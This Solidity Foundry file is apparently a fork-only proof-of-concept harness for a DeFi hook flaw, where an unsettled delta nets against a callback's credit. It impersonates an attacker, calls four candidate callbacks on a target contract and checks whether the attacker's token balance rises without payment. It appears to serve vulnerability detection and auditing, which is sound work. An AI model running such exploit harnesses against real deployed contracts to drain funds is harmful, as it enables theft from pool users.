// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console} from "forge-std/Test.sol";

/// @title Fallback PoC -- Delta netting inside a shared unlock
/// @notice Detector: shared-unlock-delta-netting. A callback takes and settles
///         inside whatever unlock the caller opened, without checking that the
///         caller's outstanding delta is settled — so an unpaid debt nets
///         against the callback's credit and value leaves for free.
/// @dev FORK-ONLY. POC_TARGET is the hook/callback contract; POC_TOKEN is the
///      asset that leaves the pool. Success is the ATTACKER'S token balance
///      rising while nothing was paid for it.
contract PoC is Test {
    address public target;
    address public token;
    uint256 public forkBlock;

    function setUp() public {
        target = vm.envOr("POC_TARGET", address(0));
        token = vm.envOr("POC_TOKEN", address(0));
        require(target != address(0), "POC_TARGET not set (the hook)");
        forkBlock = vm.envOr("POC_FORK_BLOCK", uint256(0));
        string memory rpc = vm.envOr("POC_RPC_URL", string("mainnet"));
        uint256 forkId = forkBlock == 0 ? vm.createFork(rpc) : vm.createFork(rpc, forkBlock);
        vm.selectFork(forkId);
    }

    function test_forkSanity() public {
        assertGt(target.code.length, 0, "target has no code at this fork block");
    }

    function _balance(address who) internal view returns (uint256) {
        if (token == address(0)) return who.balance;
        (bool ok, bytes memory data) = token.staticcall(abi.encodeWithSignature("balanceOf(address)", who));
        return ok && data.length >= 32 ? abi.decode(data, (uint256)) : who.balance;
    }

    function test_deltaNetsAgainstCredit() public {
        address attacker = makeAddr("attacker");
        vm.deal(attacker, 5 ether);
        uint256 before = _balance(attacker);

        // The callback is reachable directly; the exploit's precondition is that
        // the CALLER holds an unsettled delta in the same unlock.
        string[4] memory callbacks = ["lockAcquired(bytes)", "unlockCallback(bytes)", "beforeSwap(bytes)", "afterSwap(bytes)"];
        for (uint256 i = 0; i < callbacks.length; ++i) {
            vm.prank(attacker);
            (bool ok,) = target.call(abi.encodeWithSignature(callbacks[i], abi.encode(attacker)));
            console.log("tried", callbacks[i], ok ? "returned" : "reverted");
        }

        uint256 afterBal = _balance(attacker);
        console.log("attacker before/after:", before, afterBal);

        assertTrue(
            afterBal > before,
            "the attacker's balance did not rise. Tried lockAcquired(bytes), unlockCallback(bytes), beforeSwap(bytes), afterSwap(bytes) with the attacker as the caller. This does NOT establish safety: the callback may need a live PoolManager unlock opened by the attacker (this harness cannot open one), may be named differently, or the hook may already require its deltas settled — which is the fix."
        );
    }
}
